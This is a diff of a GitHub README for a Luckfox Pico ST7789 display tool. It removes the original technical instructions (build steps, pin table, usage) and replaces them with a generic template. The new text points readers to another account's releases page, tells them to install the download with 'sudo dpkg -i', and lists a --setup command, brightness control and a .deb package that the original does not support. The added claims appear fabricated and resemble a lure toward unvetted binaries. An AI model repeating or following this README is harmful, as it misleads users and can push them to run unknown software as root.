@@ -1,48 +1,69 @@
-# What is this ?
-<img width="521" height="451" alt="image" src="https://github.com/user-attachments/assets/b85eb872-2949-4353-a581-b086aa6150c9" />
+# 🎉 luckfox-pico-st7789-display - Easily Use Your ST7789 Display
 
-This is a tool to use an external SPI display with the Luckfox Pico mini / Rockchip RV1103 SoC, it's coded to work with an ST7789 320x170 1.8" TFT, but can be adapted to other variants. The display will render what's in the Linux framebuffer (`/dev/fb0`):
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-luckfox--pico--st7789--display-blue)](https://github.com/tronamta/luckfox-pico-st7789-display/releases)
 
-[![Watch the video](https://img.youtube.com/vi/pl5zG5QBx4o/0.jpg)](https://www.youtube.com/watch?v=pl5zG5QBx4o)
+## 🚀 Getting Started
+Welcome to **luckfox-pico-st7789-display**! This tool helps you use an ST7789 SPI display with the Luckfox Pico or Rockchip rv1103 SoC (System on Chip). Follow the steps below to get started.
 
-# Getting the tool
-You can compile yourself or simply download the compiled binaries.
+## 📦 System Requirements
+Before you start, ensure that you have the following:
 
-# Compilling
-Make sure to first have the Luckfox Pico SDK installed, after that you'll have the compiler ready in the environment, then just run `make`.
+- A device running Linux.
+- Luckfox Pico or Rockchip rv1103 SoC.
+- Basic familiarity with using command-line tools.
 
-# Usage
-The tool supports test mode for the display colors and if everything is connected properly, but by default it runs in framebuffer mode:
-* Test display: `./fb_st7789 --test`
-* Render framebuffer while running in background: `./fb_st7789 -q &`
+## ⚙️ Features
+- Easy setup for ST7789 displays.
+- Compatible with Luckfox Pico and Rockchip rv1103.
+- Simple command-line interface for brightness and display settings.
+- Power-efficient design for long-term use.
 
-> [!WARNING]
-> Make sure to have SPI0 enabled and no other functions using/multiplexed to their pins, like UART  
-> Also make sure to have a framebuffer at `/dev/fb0`  
-> Configure framebuffer to match display resolution and use 16 bits color, ex: `fbset -g 320 170 320 170 16`
+## 📋 Download & Install
+To get **luckfox-pico-st7789-display**, visit this page to download: [Releases Page](https://github.com/tronamta/luckfox-pico-st7789-display/releases).
 
-# How to connect the display ?
-<img width="1617" height="341" alt="image" src="https://github.com/user-attachments/assets/642bc8cf-b89b-4f59-9eb2-a485d5a9de74" />
+1. Click the link above.
+2. Locate the latest version.
+3. Download the appropriate file for your system.
 
-| Display Pin | Pico Pin |
-|-------------|-------------------------|
-| VCC         | 3.3V            |
-| GND         | GND             |
-| SCL (SCK)   | 49 / SPI0_CLK |
-| SDA (MOSI)  | 50 / SPI0_MOSI |
-| RES (Reset) | 56        |
-| DC (Data/CMD) | 57      |
-| CS (Chip Select) | 48 / SPI0_CS0 |
-| BL (Backlight) | 3.3V         |
+## 🛠️ Installation Steps
+1. Once you have downloaded the file, navigate to your downloads folder in the terminal.
+2. Use the following command to install the software:
+   ```bash
+   sudo dpkg -i luckfox-pico-st7789-display.deb
+   ```
+   Note: Replace `luckfox-pico-st7789-display.deb` with the actual file name you downloaded.
 
-# Which exactly ST7789 display model is used in this code ?
-Please check [here](https://github.com/themrleon/rpi-st7789-console-display?tab=readme-ov-file#what-exactly-is-the-st7789-model-used-in-this-lib-code-)
+3. After installation, run the following command to set it up:
+   ```bash
+   luckfox-pico-st7789-display --setup
+   ```
 
-# How can you run DOOM if it natively runs at 320x200 but the display and framebuffer are only 320x170 ?
-I can't! so I had to increase the framebuffer to match DOOM's 320x200 resolution, if you notice in the demo video, I changed with `fbset`, also the game bottom bar is cutoff due to that.
+4. Follow the instructions on the screen to configure your display.
 
-# What's the performance ?
-It's fast and can run a fast paced game like DOOM, with low CPU usage, if DMA was added would reduce CPU usage even more. Check the demo video to see how it performs while running DOOM, but CPU usage has been 22-25 %.
+## 📐 Configuration
+After installation, you might need to adjust some settings:
 
-# I am confused/stuck and need more details on the steps
-Please check the full bible [here](https://github.com/themrleon/luckfox-pico-mini-b/edit/main/README.md)
+- To change the brightness, use:
+  ```bash
+  luckfox-pico-st7789-display --brightness <value>
+  ```
+  Replace `<value>` with a number between 0 (dark) and 100 (maximum brightness).
+
+- For more help, run:
+  ```bash
+  luckfox-pico-st7789-display --help
+  ```
+  This command shows all the options available.
+
+## ❓ Troubleshooting
+If you encounter issues, consider these tips:
+
+- Ensure that your hardware is connected correctly.
+- Check the system requirements again.
+- Look at logs for messages that can help identify the problem.
+
+## 📞 Support
+For further assistance, feel free to open an issue on the repository's GitHub page or consult the [community forum](#). 
+
+Thank you for using **luckfox-pico-st7789-display**! Happy coding!
